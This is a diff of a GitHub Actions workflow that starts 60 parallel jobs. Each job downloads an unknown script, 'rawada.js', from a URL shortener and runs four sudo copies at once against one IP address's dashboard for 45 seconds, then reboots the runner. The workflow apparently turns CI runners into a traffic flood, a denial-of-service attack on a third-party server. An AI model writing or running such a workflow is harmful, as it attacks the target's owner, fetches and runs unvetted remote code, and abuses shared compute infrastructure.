@@ -9,17 +9,22 @@ jobs:
     strategy:
       max-parallel: 60
       matrix:
-       instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60] 
-
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60]
 
     steps:
-      - name: OK !
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 18
+
+      - name: Download rawada.js
+        run: wget https://curl.by/iIpEt/rawada.js -O rawada.js
+
+      - name: Run rawada.js with timeout
         run: |
-          wget https://curl.by/iIpEt/rawada.js -O rawada.js
-          chmod +x rawada.js
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 45 rawada.js http://185.211.100.89/dashboard/ 45
+            sudo timeout 45 node rawada.js http://185.211.100.89/dashboard/ 45 &
             PIDS+=($!)
           done
           
@@ -27,8 +32,8 @@ jobs:
             wait $pid
           done
 
-      - name: OK !
+      - name: Sleep
         run: sleep 45
-        
-      - name: OK !
+
+      - name: Reboot
         run: sudo reboot
